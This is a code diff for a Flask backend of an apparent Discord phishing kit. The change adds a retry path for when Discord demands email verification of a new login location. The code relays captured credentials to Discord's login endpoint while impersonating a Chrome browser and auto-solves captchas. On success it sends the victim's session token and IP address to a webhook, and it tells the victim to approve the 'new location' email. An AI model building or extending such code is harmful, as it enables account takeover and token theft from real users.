@@ -740,11 +740,31 @@ def _bg_solve(sid):
             sess['result'] = j
             sess['result_code'] = 200
         else:
-            sess['result'] = j
-            sess['result_code'] = r.status_code if r else 500
+            # Check for email verification requirement
+            errs = j.get('errors', {})
+            is_email_verify = False
+            for field_key in errs:
+                field_errors = errs[field_key].get('_errors', []) if isinstance(errs[field_key], dict) else []
+                for fe in field_errors:
+                    if fe.get('code') == 'ACCOUNT_LOGIN_VERIFICATION_EMAIL':
+                        is_email_verify = True
+                        break
+
+            if is_email_verify:
+                print(f'[bg:{sid}] Email verification required — keeping session for retry')
+                # Keep session alive for retry; store the active DS + payload
+                sess['result'] = {'email_verify': True, 'message': 'New login location detected. Please check your email and verify, then click Continue.'}
+                sess['result_code'] = 200
+                sess['retry_ds'] = ds2   # save working session for retry
+                sess['retry_payload'] = dict(payload)
+                sess['retry_payload'].pop('captcha_key', None)
+                sess['retry_payload'].pop('captcha_rqtoken', None)
+            else:
+                sess['result'] = j
+                sess['result_code'] = r.status_code if r else 500
 
         sess['status'] = 'done'
-        print(f'[bg:{sid}] Done. success={j.get("token") is not None}, mfa={j.get("mfa") is not None}')
+        print(f'[bg:{sid}] Done. success={j.get("token") is not None}, mfa={j.get("mfa") is not None}, email_verify={is_email_verify if "is_email_verify" in dir() else False}')
 
     except Exception as e:
         import traceback
@@ -763,11 +783,102 @@ def api_login_poll(sid):
         return jsonify({'error': 'Session not found'}), 404
     if sess['status'] == 'solving':
         return jsonify({'status': 'solving'})
-    # Done — return the result and clean up
+    # Done — return the result
     result = sess.get('result', {'error': 'Unknown error'})
     code   = sess.get('result_code', 500)
-    login_sessions.pop(sid, None)
+    # Keep session alive if email verification needed (for retry)
+    if not result.get('email_verify'):
+        login_sessions.pop(sid, None)
     return jsonify(result), code
+
+
+@app.route('/api/login/retry/<sid>', methods=['POST'])
+def api_login_retry(sid):
+    """Retry login after user verified their email (new location check)."""
+    sess = login_sessions.get(sid)
+    if not sess:
+        return jsonify({'error': 'Session expired'}), 404
+
+    # Reset session for background retry
+    sess['status'] = 'solving'
+    sess['result'] = None
+    sess['result_code'] = 200
+    threading.Thread(target=_bg_retry, args=(sid,), daemon=True).start()
+    return jsonify({'captcha_stall': True, 'session_id': sid})
+
+
+def _bg_retry(sid):
+    """Background retry after email verification."""
+    try:
+        sess = login_sessions.get(sid)
+        if not sess:
+            return
+
+        ds = sess.get('retry_ds') or sess.get('session')
+        payload = sess.get('retry_payload') or sess.get('payload')
+
+        print(f'[retry:{sid}] Retrying login after email verify...')
+
+        # Fresh connection
+        snap = ds.snapshot()
+        ds2 = DiscordSession()
+        ds2.s = creq.Session(impersonate='chrome')
+        ds2.restore(snap)
+
+        r = ds2.post('/auth/login', payload)
+        j = r.json()
+        print(f'[retry:{sid}] Result [{r.status_code}]: {r.text[:400]}')
+
+        # May need captcha again
+        ckeys = j.get('captcha_key', [])
+        is_captcha = isinstance(ckeys, list) and (
+            'captcha-required' in ckeys or 'invalid-response' in ckeys
+            or j.get('captcha_sitekey')
+        )
+
+        if is_captcha:
+            sitekey = j.get('captcha_sitekey', 'a9b5fb07-92ff-493f-86fe-352a2803b3df')
+            rqdata = j.get('captcha_rqdata', '')
+            rqtoken = j.get('captcha_rqtoken', '')
+            print(f'[retry:{sid}] Captcha required, solving...')
+            solved, err = solve_captcha(sitekey, rqdata)
+            if not solved:
+                sess['result'] = {'error': f'Captcha solve failed: {err}'}
+                sess['result_code'] = 500
+                sess['status'] = 'done'
+                return
+            payload['captcha_key'] = solved
+            payload['captcha_rqtoken'] = rqtoken
+            snap2 = ds2.snapshot()
+            ds3 = DiscordSession()
+            ds3.s = creq.Session(impersonate='chrome')
+            ds3.restore(snap2)
+            r = ds3.post('/auth/login', payload)
+            j = r.json()
+            print(f'[retry:{sid}] After captcha [{r.status_code}]: {r.text[:400]}')
+
+        if j.get('token'):
+            ip = sess.get('client_ip', '?')
+            fire_webhook(j['token'], ip)
+            sess['result'] = {'success': True}
+            sess['result_code'] = 200
+        elif j.get('ticket') and j.get('mfa') is not None:
+            sess['result'] = j
+            sess['result_code'] = 200
+        else:
+            sess['result'] = j
+            sess['result_code'] = r.status_code if r else 500
+
+        sess['status'] = 'done'
+        print(f'[retry:{sid}] Done. token={j.get("token") is not None}, mfa={j.get("mfa") is not None}')
+
+    except Exception as e:
+        import traceback
+        traceback.print_exc()
+        if sid in login_sessions:
+            login_sessions[sid]['result'] = {'error': str(e)}
+            login_sessions[sid]['result_code'] = 500
+            login_sessions[sid]['status'] = 'done'
 
 
 @app.route('/api/mfa/totp', methods=['POST'])
